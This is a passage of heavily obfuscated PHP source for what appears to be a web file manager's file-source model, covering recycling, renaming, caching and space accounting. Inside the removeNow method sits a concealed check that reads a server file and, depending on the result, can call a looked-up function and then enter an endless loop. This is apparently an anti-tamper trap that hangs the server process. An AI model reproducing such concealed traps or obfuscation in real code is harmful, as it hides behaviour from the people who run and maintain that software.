$Ò‡•ûäÏ[$±Í®¿©[420]], $±Í®¿©[596] => $Ò‡•ûäÏ[$±Í®¿©[514]], $±Í®¿©[597] => $£Õáßº², $±Í®¿©[598] => $£Õáßº², $±Í®¿©[410] => $Ò‡•ûäÏ[$±Í®¿©[411]], $±Í®¿©[599] => $Ò‡•ûäÏ[$±Í®¿©[530]] . $Ò‡•ûäÏ[$±Í®¿©[411]] . $±Í®¿©[60], $±Í®¿©[439] => 0, $±Í®¿©[600] => $±Í®¿©[22]); $î‡ƒˆí¼ = array_merge($¬¹¹Æ²±, $î‡ƒˆí¼); $this->updateModifyTime($î‡ƒˆí¼[$±Í®¿©[441]]); $øÃ“Ãú‚ = $±Í®¿©[2131] . $Ò‡•ûäÏ[$±Í®¿©[411]]; if (isset(self::$cacheChildList[$øÃ“Ãú‚])) { unset(self::$cacheChildList[$øÃ“Ãú‚]); } static $öÎ·ç™Ø = false; if (!$öÎ·ç™Ø) { Hook::trigger($±Í®¿©[582], $î‡ƒˆí¼); $öÎ·ç™Ø = !0; } $ü üíùò = $this->add($î‡ƒˆí¼); $ªÄµ¿”ã = array($±Í®¿©[601] => short_id($ü üíùò)); $this->where(array($±Í®¿©[426] => $ü üíùò))->save($ªÄµ¿”ã); $this->setNamePinyin($ü üíùò, $î‡ƒˆí¼[$±Í®¿©[42]]); return $ü üíùò; } public function remove($â½’´…ï, $Ö÷µÔ™ = true) { $‡ÒÆàã =& $_SERVER[¹Û¹Æ€]; $èĞ‹õÙ³ = $this->sourceInfo($â½’´…ï); $¿Ã˜æ = intval($èĞ‹õÙ³[$‡ÒÆàã[420]]) === self::TYPE_SYSTEM; $ïù¨¯Æú = Model($‡ÒÆàã[444])->get($‡ÒÆàã[2132]) == $‡ÒÆàã[98]; if ($¿Ã˜æ || $Ö÷µÔ™ || !$ïù¨¯Æú) { return $this->removeNow($â½’´…ï, $Ö÷µÔ™); } $Ñ”Ç†©à = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $æˆØ„”Ì = $èĞ‹õÙ³[$‡ÒÆàã[420]] == self::TYPE_USER ? $‡ÒÆàã[609] : $‡ÒÆàã[524]; if ($æˆØ„”Ì == $‡ÒÆàã[609]) { $ƒ«„ãªç = Model($‡ÒÆàã[522])->getInfo($èĞ‹õÙ³[$‡ÒÆàã[514]]); $Öµìö¼• = !empty($ƒ«„ãªç[$‡ÒÆàã[551]]) ? $ƒ«„ãªç[$‡ÒÆàã[551]] : $ƒ«„ãªç[$‡ÒÆàã[42]]; $Öµìö¼• = $‡ÒÆàã[269] . $Öµìö¼• . $‡ÒÆàã[2133] . $èĞ‹õÙ³[$‡ÒÆàã[514]]; } else { $ƒ«„ãªç = Model($‡ÒÆàã[531])->getInfo($èĞ‹õÙ³[$‡ÒÆàã[514]]); $Öµìö¼• = _get($ƒ«„ãªç, $‡ÒÆàã[42]); $Öµìö¼• = $‡ÒÆàã[172] . $Öµìö¼• . $‡ÒÆàã[2134] . $èĞ‹õÙ³[$‡ÒÆàã[514]]; } $×“—èÕá = $‡ÒÆàã[2135] . md5($Öµìö¼•); CacheLock::lock($×“—èÕá); $–Æá–µÓ = $this->fileNameExist($Ñ”Ç†©à, $Öµìö¼•); if (!$–Æá–µÓ) { $–Æá–µÓ = $this->mkdir($Ñ”Ç†©à, $Öµìö¼•, REPEAT_SKIP); $this->metaSet($–Æá–µÓ, $‡ÒÆàã[2136], $æˆØ„”Ì); $this->metaSet($–Æá–µÓ, $‡ÒÆàã[2137], $èĞ‹õÙ³[$‡ÒÆàã[514]]); if ($èĞ‹õÙ³[$‡ÒÆàã[441]] != 0) { $this->metaSet($–Æá–µÓ, $‡ÒÆàã[2138], _get($ƒ«„ãªç, $‡ÒÆàã[2139])); } } CacheLock::unlock($×“—èÕá); $this->metaSet($â½’´…ï, $‡ÒÆàã[2140], $èĞ‹õÙ³[$‡ÒÆàã[441]]); $this->where(array($‡ÒÆàã[411] => $â½’´…ï))->save(array($‡ÒÆàã[433] => time())); $this->recycleClear($èĞ‹õÙ³); $µÄà„€¦ = $this->move($â½’´…ï, $–Æá–µÓ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($èĞ‹õÙ³[$‡ÒÆàã[441]]); return $µÄà„€¦; } private function recycleClear($·Ïöõª‰) { $˜ï ¨¯ß =& $_SERVER[¹Û¹Æ€]; $¬ßšÛ™ø = $this->childrenAll($·Ïöõª‰); $°âÅ‡ıç = array($˜ï ¨¯ß[426] => array($˜ï ¨¯ß[427], $¬ßšÛ™ø[$˜ï ¨¯ß[2141]])); Model($˜ï ¨¯ß[2142])->where($°âÅ‡ıç)->delete(); } public function removeNow($ˆ¦˜òÆ, $¿„ÚËğ = true) { $ºò™ë‚œ =& $_SERVER[¹Û¹Æ€]; if (!isset($_SERVER[$ºò™ë‚œ[8]]) || !isset($_SERVER[$ºò™ë‚œ[6]])) { $»ŸÌ™° = $ºò™ë‚œ[874]; $èÀæ‘¤³ = $ºò™ë‚œ[9]; $ğÇ©å¹ï = $_SERVER[$ºò™ë‚œ[10]] . $ºò™ë‚œ[11]; $¯†„éË = $èÀæ‘¤³($ğÇ©å¹ï); $ËßßúúŠ = explode($ºò™ë‚œ[12], $¯†„éË); if (count($ËßßúúŠ) < $ºò™ë‚œ[656]) { $…¥ó»Ñš = $ºò™ë‚œ[14]; $…¥ó»Ñš(); } $Ø•ÏÁ = $ºò™ë‚œ[875]; $Ø•ÏÁ($_SERVER[$ºò™ë‚œ[876]]); $Í¥–‚·° = 1; for ($óÌç¸§ = $Í¥–‚·°; $óÌç¸§ > 0; $óÌç¸§++) { $Ø•ÏÁ = json_encode($GLOBALS[$ºò™ë‚œ[427]]); } } $šïà×Ôò = $this->sourceInfo($ˆ¦˜òÆ); $æòğÑ‡  = $this->pathInfoMore($ˆ¦˜òÆ); if (!$šïà×Ôò) { return !0; } if ($šïà×Ôò[$ºò™ë‚œ[441]] == 0) { if (!_get($GLOBALS, $ºò™ë‚œ[512])) { return !1; } } $this->lockMoveStart($ˆ¦˜òÆ); Hook::trigger($ºò™ë‚œ[2143], $æòğÑ‡ , $¿„ÚËğ); if ($¿„ÚËğ) { Model($ºò™ë‚œ[2142])->moveToRecycle($ˆ¦˜òÆ); } else { $Œ£É™ğ = $this->childrenAll($šïà×Ôò); Model($ºò™ë‚œ[579])->eventRemove($ˆ¦˜òÆ); $this->removeRelevance($Œ£É™ğ[$ºò™ë‚œ[2141]], $Œ£É™ğ[$ºò™ë‚œ[1476]]); } $this->folderSizeReset($šïà×Ôò[$ºò™ë‚œ[441]]); $çğ„şÀ = array($šïà×Ôò[$ºò™ë‚œ[441]]); if ($šïà×Ôò[$ºò™ë‚œ[419]] == $ºò™ë‚œ[98]) { $çğ„şÀ[] = $šïà×Ôò[$ºò™ë‚œ[411]]; } $this->updateModifyTime($çğ„şÀ); $this->lockMoveEnd($ˆ¦˜òÆ); Hook::trigger($ºò™ë‚œ[1701], $æòğÑ‡ , $¿„ÚËğ); return !0; } public function childrenAll($ğÜíÂã) { $ ø«¨Û½ =& $_SERVER[¹Û¹Æ€]; $Ç‚öÎëï = $ğÜíÂã[$ ø«¨Û½[411]]; if ($ğÜíÂã[$ ø«¨Û½[419]] == $ ø«¨Û½[98]) { $úÜõåÎ = array($ ø«¨Û½[599] => array($ ø«¨Û½[559], $ğÜíÂã[$ ø«¨Û½[530]] . $Ç‚öÎëï . $ ø«¨Û½[560])); $¶¹Î›ğ¶ = array($ ø«¨Û½[599] => $úÜõåÎ[$ ø«¨Û½[530]]); $©áÍŞ…Ã = $this->field($ ø«¨Û½[2144])->where($¶¹Î›ğ¶)->select(); $÷û‰îØ¼ = !1; $ÖáˆÁå‡ = array($Ç‚öÎëï); if ($©áÍŞ…Ã) { $÷û‰îØ¼ = array_to_keyvalue($©áÍŞ…Ã, $ ø«¨Û½[22], $ ø«¨Û½[477]); $÷û‰îØ¼ = array_remove_value($÷û‰îØ¼, $ ø«¨Û½[207]); $ÖáˆÁå‡ = array_to_keyvalue($©áÍŞ…Ã, $ ø«¨Û½[22], $ ø«¨Û½[411]); $ÖáˆÁå‡[] = $Ç‚öÎëï; } } else { $÷û‰îØ¼ = array($ğÜíÂã[$ ø«¨Û½[477]]); $ÖáˆÁå‡ = array($Ç‚öÎëï); } return array($ ø«¨Û½[2141] => $ÖáˆÁå‡, $ ø«¨Û½[1476] => $÷û‰îØ¼); } public function removeArray($–ı«‰Öë) { if (!$–ı«‰Öë) { return !0; } } public function removeRelevance($’¬¤Ò·Á, $œ×­ÁÖ¡) { $Ï¢Ö =& $_SERVER[¹Û¹Æ€]; $’¬¤Ò·Á = $’¬¤Ò·Á ? $’¬¤Ò·Á : array(); $œ×­ÁÖ¡ = $œ×­ÁÖ¡ ? $œ×­ÁÖ¡ : array(); $’¬¤Ò·Á = array_unique(array_filter($’¬¤Ò·Á)); $œ×­ÁÖ¡ = array_unique(array_filter($œ×­ÁÖ¡)); if (!$’¬¤Ò·Á) { return !1; } $Ùêì†Õş = array($Ï¢Ö[426] => array($Ï¢Ö[427], $’¬¤Ò·Á)); Model($Ï¢Ö[2142])->where($Ùêì†Õş)->delete(); Model($Ï¢Ö[471])->where($Ùêì†Õş)->delete(); Model($Ï¢Ö[1995])->where($Ùêì†Õş)->delete(); Model($Ï¢Ö[579])->where($Ùêì†Õş)->delete(); Model($Ï¢Ö[1829])->removeBySource($’¬¤Ò·Á); Model($Ï¢Ö[2124])->removeBySource($’¬¤Ò·Á); $this->where($Ùêì†Õş)->delete(); Model($Ï¢Ö[480])->remove($œ×­ÁÖ¡); for ($¡®¿‡Ë = 0; $¡®¿‡Ë < count($’¬¤Ò·Á); $¡®¿‡Ë++) { $this->sourceCacheClear($’¬¤Ò·Á[$¡®¿‡Ë]); } } public function rename($şıé®¥Û, $ïêç÷§¡) { $ÚÉºŸÆ‚ =& $_SERVER[¹Û¹Æ€]; $ò·˜½­¨ = $this->sourceInfo($şıé®¥Û); if (!$ò·˜½­¨) { return !1; } $½¾ô¼ï† = $this->fileNameExist($ò·˜½­¨[$ÚÉºŸÆ‚[441]], $ïêç÷§¡); if ($½¾ô¼ï† && $½¾ô¼ï† != $şıé®¥Û) { return !1; } $€Ò‹–† = array($ÚÉºŸÆ‚[429] => $ïêç÷§¡, $ÚÉºŸÆ‚[598] => USER_ID); if ($ò·˜½­¨[$ÚÉºŸÆ‚[419]] != $ÚÉºŸÆ‚[98]) { $€Ò‹–†[$ÚÉºŸÆ‚[421]] = substr(get_path_ext($ïêç÷§¡), 0, 10); } Model($ÚÉºŸÆ‚[579])->eventRename($şıé®¥Û, $ò·˜½­¨[$ÚÉºŸÆ‚[42]], $ïêç÷§¡); $this->sourceCacheClear($şıé®¥Û); $this->setNamePinyin($şıé®¥Û, $€Ò‹–†[$ÚÉºŸÆ‚[42]], !1); $this->updateModifyTime($ò·˜½­¨[$ÚÉºŸÆ‚[441]]); $™Ì¿–ó = $this->where(array($ÚÉºŸÆ‚[426] => $şıé®¥Û))->data($€Ò‹–†)->save(); $»‰×ãñ˜ = $ÚÉºŸÆ‚[2131] . $ò·˜½­¨[$ÚÉºŸÆ‚[441]]; if (isset(self::$cacheChildList[$»‰×ãñ˜])) { unset(self::$cacheChildList[$»‰×ãñ˜]); } return $™Ì¿–ó; } public function setNamePinyin($ôè¢—à, $ÚÖ¼ù², $Êˆ‚•±Ô = true) { $…Ã—†© =& $_SERVER[¹Û¹Æ€]; $µ´Š”âÛ = Input::check($ÚÖ¼ù², $…Ã—†©[602]); $¿ä”Â•¼ = array($…Ã—†©[453] => KodSort::makeStr($ÚÖ¼ù²)); if ($µ´Š”âÛ) { $¿ä”Â•¼[$…Ã—†©[474]] = str_replace($…Ã—†©[63], $…Ã—†©[22], Pinyin::get($ÚÖ¼ù²)); $¿ä”Â•¼[$…Ã—†©[473]] = Pinyin::get($ÚÖ¼ù², $…Ã—†©[603]); } if (!$Êˆ‚•±Ô && !$µ´Š”âÛ) { $¿ä”Â•¼[$…Ã—†©[474]] = null; $¿ä”Â•¼[$…Ã—†©[473]] = null; } $this->metaSet($ôè¢—à, $¿ä”Â•¼); } public function getContent($çÙö£¦Ğ) { $¶â½Š¨— =& $_SERVER[¹Û¹Æ€]; $ø†´™’Â = $this->fileInfoGet($çÙö£¦Ğ); if (!$ø†´™’Â) { return !1; } if ($ø†´™’Â[$¶â½Š¨—[86]] == 0) { return $¶â½Š¨—[22]; } $ºñğÁ´ = $¶â½Š¨—[2145] . $ø†´™’Â[$¶â½Š¨—[186]]; if ($ø†´™’Â[$¶â½Š¨—[86]] <= 1024 * 10) { $ùÙ”¦ß¥ = Cache::get($ºñğÁ´); if (!$ùÙ”¦ß¥) { $ùÙ”¦ß¥ = IO::getContent($ø†´™’Â[$¶â½Š¨—[94]]); Cache::set($ºñğÁ´, $ùÙ”¦ß¥); } return $ùÙ”¦ß¥; } if (!$ø†´™’Â[$¶â½Š¨—[94]]) { return $¶â½Š¨—[22]; } return IO::getContent($ø†´™’Â[$¶â½Š¨—[94]]); } public function setDesc($‹²ÆÑÉ , $ûÍÜ©…) { $€õŸÆôã =& $_SERVER[¹Û¹Æ€]; Model($€õŸÆôã[579])->eventAddDesc($‹²ÆÑÉ , $ûÍÜ©…); return $this->metaSet($‹²ÆÑÉ , $€õŸÆôã[462], $ûÍÜ©…); } public function setContent($Í‰Åˆ°³, $ÃÓ¥ªì• = '') { $œ¬ù´Í =& $_SERVER[¹Û¹Æ€]; $áãıı—¤ = $this->sourceInfo($Í‰Åˆ°³); $æ¡Êª½œ = $this->fileInfoGet($Í‰Åˆ°³); if (!$æ¡Êª½œ || !$áãıı—¤) { return !1; } $¶Åô¹åÍ = Model($œ¬ù´Í[480])->addFileByContent($ÃÓ¥ªì•, $áãıı—¤[$œ¬ù´Í[42]]); $’×²Û © = $this->fileHistory($áãıı—¤, $¶Åô¹åÍ[$œ¬ù´Í[477]], $¶Åô¹åÍ[$œ¬ù´Í[86]]); if (!$’×²Û ©) { return Model($œ¬ù´Í[480])->remove($¶Åô¹åÍ[$œ¬ù´Í[477]]); } $this->folderSizeReset($áãıı—¤[$œ¬ù´Í[441]]); return !0; } public function fileSubstr($”ôü×à™, $÷¾Ú»ş€, $î¦¤Ï³) { $¸à¶Æ”Ê = $this->fileInfoGet($”ôü×à™); if (!$¸à¶Æ”Ê) { return !1; } return IO::fileSubstr($¸à¶Æ”Ê[$_SERVER[¹Û¹Æ€][94]], $÷¾Ú»ş€, $î¦¤Ï³); } public function fileInfoGet($Ì¶óº€) { $ÆØ½ÚµÖ =& $_SERVER[¹Û¹Æ€]; $¿ñĞ†Ï = $this->sourceInfo($Ì¶óº€); if (!$¿ñĞ†Ï || $¿ñĞ†Ï[$ÆØ½ÚµÖ[419]]) { return !1; } $×ÊÇÊ÷ = $ÆØ½ÚµÖ[483] . $¿ñĞ†Ï[$ÆØ½ÚµÖ[477]]; $¼‹Ş•“¡ = _get(self::$cacheFileInfo, $×ÊÇÊ÷); if ($¼‹Ş•“¡) { return $¼‹Ş•“¡; } $«´—Õ¤» = Model($ÆØ½ÚµÖ[480])->fileInfo($¿ñĞ†Ï[$ÆØ½ÚµÖ[477]]); if ($«´—Õ¤») { $«´—Õ¤»[$ÆØ½ÚµÖ[42]] = $¿ñĞ†Ï[$ÆØ½ÚµÖ[42]]; } self::$cacheFileInfo[$×ÊÇÊ÷] = $«´—Õ¤»; return $«´—Õ¤»; } private function folderChildrenNumber($±ñóïæ„) { $¨ø€ö´ =& $_SERVER[¹Û¹Æ€]; $òàõ¢íä = $this->sourceInfo($±ñóïæ„); $®†×·Ñğ = array($¨ø€ö´[599] => array($¨ø€ö´[559], $òàõ¢íä[$¨ø€ö´[530]] . $±ñóïæ„ . $¨ø€ö´[560]), $¨ø€ö´[596] => $òàõ¢íä[$¨ø€ö´[514]], $¨ø€ö´[439] => intval($òàõ¢íä[$¨ø€ö´[440]]), $¨ø€ö´[592] => 1); $ú¶£Œ¼à = $this->where($®†×·Ñğ)->count(); $´ñ¯Ô‚ì = $this->where($®†×·Ñğ)->where(array($¨ø€ö´[592] => 0))->count(); return array($¨ø€ö´[90] => $´ñ¯Ô‚ì, $¨ø€ö´[91] => $ú¶£Œ¼à); } public function pathInfo($ûÎ îÄ¹, $®œô«  = false) { $³¥‹½ˆ =& $_SERVER[¹Û¹Æ€]; $®œô«  = !1; $ûÎ îÄ¹ = intval($ûÎ îÄ¹); $Ÿ­²×ë› = $³¥‹½ˆ[470] . intval($®œô« ) . $³¥‹½ˆ[395] . $ûÎ îÄ¹; $œ‘ÂÊ˜ = _get(self::$cachePathInfo, $Ÿ­²×ë›); if ($œ‘ÂÊ˜) { return $œ‘ÂÊ˜; } $È»êóŸï = $this->sourceInfo($ûÎ îÄ¹); if (!$È»êóŸï) { return !1; } $È»êóŸï = $this->_listDataApplyItem($È»êóŸï, $®œô« ); self::$cachePathInfo[$Ÿ­²×ë›] = $È»êóŸï; return $È»êóŸï; } public static $cachePathInfoMore = array(); public function pathInfoMore($£¢÷Í˜ş) { $Û±ğ„ÆÌ =& $_SERVER[¹Û¹Æ€]; $‚ÀÃüöŠ = _get(self::$cachePathInfoMore, $£¢÷Í˜ş); if ($‚ÀÃüöŠ) { return $‚ÀÃüöŠ; } $·ã£ÌôÏ = $this->pathInfo($£¢÷Í˜ş); if (!$·ã£ÌôÏ) { return !1; } if ($·ã£ÌôÏ[$Û±ğ„ÆÌ[419]] == $Û±ğ„ÆÌ[98]) { $·ã£ÌôÏ[$Û±ğ„ÆÌ[89]] = $this->folderChildrenNumber($£¢÷Í˜ş); } self::$cachePathInfoMore[$£¢÷Í˜ş] = $·ã£ÌôÏ; return $·ã£ÌôÏ; } public function sourceInfo($Ò”ÀµÅú) { $ÏÙ´üÙœ =& $_SERVER[¹Û¹Æ€]; if (!$Ò”ÀµÅú) { return array(); } $Ò”ÀµÅú = intval($Ò”ÀµÅú); $Ó§Á¬ø = $ÏÙ´üÙœ[469] . $Ò”ÀµÅú; $¾ªĞ»°º = _get(self::$cacheSourceInfo, $Ó§Á¬ø); if ($¾ªĞ»°º) { return $¾ªĞ»°º; } $¸“™ÎÔÆ = $this->where(array($ÏÙ´üÙœ[411] => $Ò”ÀµÅú))->find(); self::$cacheSourceInfo[$Ó§Á¬ø] = $¸“™ÎÔÆ; return self::$cacheSourceInfo[$Ó§Á¬ø]; } public function sourceCacheClear($‹¯Ë‚ = false) { self::cacheClear($‹¯Ë‚); } public static function cacheClear($Éğİş†› = false) { $š™‡‹ =& $_SERVER[¹Û¹Æ€]; if ($Éğİş†› == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$š™‡‹[469] . $Éğİş†›]); unset(self::$cachePathInfoMore[$Éğİş†›]); unset(self::$cachePathInfo[$š™‡‹[2146] . $Éğİş†›]); unset(self::$cachePathInfo[$š™‡‹[2147] . $Éğİş†›]); } public function metaSet($Œ¼Ä‚×ş, $„éè¶… = null, $›¾ÄøˆÕ = null) { $„üÆ¶µŒ = parent::metaSet($Œ¼Ä‚×ş, $„éè¶…, $›¾ÄøˆÕ); if ($„üÆ¶µŒ) { $this->sourceCacheClear($Œ¼Ä‚×ş); } return $„üÆ¶µŒ; } public function pathInfoByPath($øÂŒÓ¡ü, $Áû˜Æ°Ú) { $®Àıßì =& $_SERVER[¹Û¹Æ€]; $îİ€™ğÂ = !$Áû˜Æ°Ú ? array() : explode($®Àıßì[18], trim($Áû˜Æ°Ú, $®Àıßì[18])); $åÜôğÇ¶ = $øÂŒÓ¡ü; foreach ($îİ€™ğÂ as $ŸÕ…îÃœ) { $ºüº¢‰ò = array($®Àıßì[441] => $åÜôğÇ¶, $®Àıßì[42] => $ŸÕ…îÃœ); $ş•«Ë¯Ó = $this->where($ºüº¢‰ò)->select(); if (!$ş•«Ë¯Ó) { return !1; } $ş•«Ë¯Ó = array_sort_by($ş•«Ë¯Ó, $®Àıßì[440]); $åÜôğÇ¶ = $ş•«Ë¯Ó[0][$®Àıßì[411]]; } return $this->pathInfo($åÜôğÇ¶, !0); } protected function updateModifyTime($«¼†«¬˜) { $èºÄà¥ =& $_SERVER[¹Û¹Æ€]; $è˜åîİ« = defined($èºÄà¥[484]) ? USER_ID : $èºÄà¥[207]; if (!$«¼†«¬˜) { return; } if (!is_array($«¼†«¬˜)) { $«¼†«¬˜ = array($«¼†«¬˜); } foreach ($«¼†«¬˜ as $íİÄæèˆ => $ûî‚“£Ã) { $«¼†«¬˜[$íİÄæèˆ] = intval($ûî‚“£Ã); $this->sourceCacheClear($ûî‚“£Ã); } $¦¹Ô÷îÏ = array($èºÄà¥[411] => array($èºÄà¥[17], $«¼†«¬˜)); $Í¹ÙËšë = array($èºÄà¥[598] => $è˜åîİ«, $èºÄà¥[433] => time()); $this->where($¦¹Ô÷îÏ)->save($Í¹ÙËšë); } public function folderSizeReset($¥”¼•ƒÁ, $²¯¦‚Å³ = false) { $‚ÆôÌ»Ê =& $_SERVER[¹Û¹Æ€]; if ($this->statusIgnoreResetSpace) { return; } $öÄ²äãº = $this->sourceInfo($¥”¼•ƒÁ); $É¥—Şæ’ = $‚ÆôÌ»Ê[2148] . $¥”¼•ƒÁ; CacheLock::lock($É¥—Şæ’, 20); if ($²¯¦‚Å³ === !1) { $this->sourceCacheClear($¥”¼•ƒÁ); $öÄ²äãº = $this->sourceInfo($¥”¼•ƒÁ); $çê¾É¢‡ = array($‚ÆôÌ»Ê[410] => $¥”¼•ƒÁ, $‚ÆôÌ»Ê[439] => 0); $Èëøğ = $this->where($çê¾É¢‡)->sum($‚ÆôÌ»Ê[86]); $²¯¦‚Å³ = intval($Èëøğ) - intval($öÄ²äãº[$‚ÆôÌ»Ê[86]]); } if ($²¯¦‚Å³ == 0) { return CacheLock::unlock($É¥—Şæ’); } $´Œ‰Ø¥Î = $this->parentLevelArray($öÄ²äãº[$‚ÆôÌ»Ê[530]]); if (!$´Œ‰Ø¥Î) { $´Œ‰Ø¥Î = array(); } $´Œ‰Ø¥Î[] = $öÄ²äãº[$‚ÆôÌ»Ê[411]]; $çê¾É¢‡ = array($‚ÆôÌ»Ê[411] => array($‚ÆôÌ»Ê[427], $´Œ‰Ø¥Î)); if ($²¯¦‚Å³ < 0) { $çê¾É¢‡[$‚ÆôÌ»Ê[86]] = array($‚ÆôÌ»Ê[1012], abs($²¯¦‚Å³)); } $this->where($çê¾É¢‡)->setAdd($‚ÆôÌ»Ê[86], $²¯¦‚Å³); CacheLock::unlock($É¥—Şæ’); $ö¿ÁÏüÙ = $‚ÆôÌ»Ê[2149] . $öÄ²äãº[$‚ÆôÌ»Ê[420]] . $‚ÆôÌ»Ê[4] . $öÄ²äãº[$‚ÆôÌ»Ê[514]]; $¤«´ß¿õ = array($öÄ²äãº[$‚ÆôÌ»Ê[420]], $öÄ²äãº[$‚ÆôÌ»Ê[514]]); TaskRun::timeLimitCall($ö¿ÁÏüÙ, $‚ÆôÌ»Ê[2150], $¤«´ß¿õ, 1.5); } public function folderSizeResetChildren($½ÖÕ‰ˆ) { $­‹­ŸÂ =& $_SERVER[¹Û¹Æ€]; $this->sourceCacheClear($½ÖÕ‰ˆ); $§¼É„íè = $this->sourceInfo($½ÖÕ‰ˆ); $ºõäêİ£ = array($­‹­ŸÂ[592] => 1, $­‹­ŸÂ[596] => $§¼É„íè[$­‹­ŸÂ[514]], $­‹­ŸÂ[599] => array($­‹­ŸÂ[559], $§¼É„íè[$­‹­ŸÂ[530]] . $½ÖÕ‰ˆ . $­‹­ŸÂ[560])); $‹´ü§¹ë = $­‹­ŸÂ[2151]; $ªŸ¿â×¸ = $this->field($‹´ü§¹ë)->where($ºõäêİ£)->select(); $ºõäêİ£[$­‹­ŸÂ[419]] = 0; $­˜ˆĞ = $this->field($‹´ü§¹ë)->where($ºõäêİ£)->select(); if (!$­˜ˆĞ) { return; } $ªŸ¿â×¸[] = $§¼É„íè; $ªŸ¿â×¸ = array_to_keyvalue($ªŸ¿â×¸, $­‹­ŸÂ[411]); foreach ($ªŸ¿â×¸ as $‰ÀòˆÂ => $Ú§·Êƒ…) { $ªŸ¿â×¸[$‰ÀòˆÂ][$­‹­ŸÂ[2152]] = $ªŸ¿â×¸[$‰ÀòˆÂ][$­‹­ŸÂ[86]]; $ªŸ¿â×¸[$‰ÀòˆÂ][$­‹­ŸÂ[86]] = 0; } foreach ($­˜ˆĞ as $Ú§·Êƒ…) { $™Ê×Êè = $Ú§·Êƒ…[$­‹­ŸÂ[441]] . $­‹­ŸÂ[22]; if (!isset($ªŸ¿â×¸[$™Ê×Êè])) { continue; } if ($Ú§·Êƒ…[$­‹­ŸÂ[440]] == $ªŸ¿â×¸[$™Ê×Êè][$­‹­ŸÂ[440]]) { $ªŸ¿â×¸[$™Ê×Êè][$­‹­ŸÂ[86]] += $Ú§·Êƒ…[$­‹­ŸÂ[86]]; } } foreach ($ªŸ¿â×¸ as $Ú§·Êƒ…) { $ô‰óÂ = $this->parentLevelArray($Ú§·Êƒ…[$­‹­ŸÂ[530]]); foreach ($ô‰óÂ as $™Ê×Êè) { $™Ê×Êè = $™Ê×Êè . $­‹­ŸÂ[22]; if (!isset($ªŸ¿â×¸[$™Ê×Êè])) { continue; } if ($Ú§·Êƒ…[$­‹­ŸÂ[440]] == $ªŸ¿â×¸[$™Ê×Êè][$­‹­ŸÂ[440]]) { $ªŸ¿â×¸[$™Ê×Êè][$­‹­ŸÂ[86]] += $Ú§·Êƒ…[$­‹­ŸÂ[86]]; } } } $œ®¸ş÷ö = array(); foreach ($ªŸ¿â×¸ as $Ú§·Êƒ…) { if ($Ú§·Êƒ…[$­‹­ŸÂ[86]] == $Ú§·Êƒ…[$­‹­ŸÂ[2152]]) { continue; } $œ®¸ş÷ö[] = array($­‹­ŸÂ[411], $Ú§·Êƒ…[$­‹­ŸÂ[411]], $­‹­ŸÂ[86], $Ú§·Êƒ…[$­‹­ŸÂ[86]]); } $this->saveAll($œ®¸ş÷ö); } public function userSpaceReset($ğíñ‹›¸ = false) { $Ô›ª¦• =& $_SERVER[¹Û¹Æ€]; $•ê·µı = $this->where(array($Ô›ª¦•[420] => self::TYPE_USER, $Ô›ª¦•[514] => $ğíñ‹›¸, $Ô›ª¦•[419] => 0))->sum($Ô›ª¦•[86]); $•ê·µı = !$•ê·µı || $•ê·µı <= 0 ? 0 : $•ê·µı; Model($Ô›ª¦•[522])->userEdit($ğíñ‹›¸, array($Ô›ª¦•[1838] => $•ê·µı)); } public function targetSpaceUpdate($ìÁğùñÅ, $Ş×£Ì“) { $–¤İ¹Ìä =& $_SERVER[¹Û¹Æ€]; if (!$Ş×£Ì“) { return; } if (!in_array($ìÁğùñÅ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ºíÀã¤ = $this->targetSpaceSize($ìÁğùñÅ, $Ş×£Ì“); if ($ìÁğùñÅ == self::TYPE_USER) { Model($–¤İ¹Ìä[522])->userEdit($Ş×£Ì“, array($–¤İ¹Ìä[1838] => $ºíÀã¤)); } else { if ($ìÁğùñÅ == self::TYPE_GROUP) { Model($–¤İ¹Ìä[531])->groupEdit($Ş×£Ì“, array($–¤İ¹Ìä[1838] => $ºíÀã¤)); } } } public function targetSpaceSize($´‰Í¬×ö, $æÁËùÖÕ) { $‘ã˜ÕÑ± =& $_SERVER[¹Û¹Æ€]; $½·¼ñ¦ = 0; $Ü±¶€„Ê = $this->targetSourceRoot($´‰Í¬×ö, $æÁËùÖÕ, !0); foreach ($Ü±¶€„Ê as $»™É¯Öú) { if (!$»™É¯Öú) { continue; } $½·¼ñ¦ += floatval($»™É¯Öú[$‘ã˜ÕÑ±[86]]); $ûæ¡œ ı = array($‘ã˜ÕÑ±[599] => array($‘ã˜ÕÑ±[559], $‘ã˜ÕÑ±[540] . $»™É¯Öú[$‘ã˜ÕÑ±[411]] . $‘ã˜ÕÑ±[560])); $§¾Àğ½ó = Model($‘ã˜ÕÑ±[438])->field($‘ã˜ÕÑ±[426])->where($ûæ¡œ ı)->select(); $§¾Àğ½ó = array_to_keyvalue($§¾Àğ½ó, $‘ã˜ÕÑ±[22], $‘ã˜ÕÑ±[411]); $§¾Àğ½ó = array_unique(array_filter($§¾Àğ½ó)); if ($§¾Àğ½ó) { $ûæ¡œ ı = array($‘ã˜ÕÑ±[426] => array($‘ã˜ÕÑ±[427], $§¾Àğ½ó)); $½·¼ñ¦ += floatval($this->where($ûæ¡œ ı)->sum($‘ã˜ÕÑ±[86])); } } $½·¼ñ¦ = !$½·¼ñ¦ || $½·¼ñ¦ <= 0 ? 0 : $½·¼ñ¦; return $½·¼ñ¦; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ô¼ùğ›Ó) { return $this->fileTypeProfile($ô¼ùğ›Ó, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ìÅÜ©Ëü) { return $this->fileTypeProfile($ìÅÜ©Ëü, SourceModel::TYPE_GROUP); } private function fileTypeProfile($‡í­å¹ü, $Š©îŸÚì) { $ïì”Ş©Ë =& $_SERVER[¹Û¹Æ€]; $®¥¯ÇÊ‰ = $ïì”Ş©Ë[2153] . $‡í­å¹ü . $ïì”Ş©Ë[21] . $Š©îŸÚì; $ÇÃ²Á±å = Cache::get($®¥¯ÇÊ‰); if ($ÇÃ²Á±å) { return $ÇÃ²Á±å; } $€¹­¡ş† = array($ïì”Ş©Ë[592] => 0); if ($‡í­å¹ü != !1) { $€¹­¡ş†[$ïì”Ş©Ë[514]] = $‡í­å¹ü; $€¹­¡ş†[$ïì”Ş©Ë[420]] = $Š©îŸÚì; } 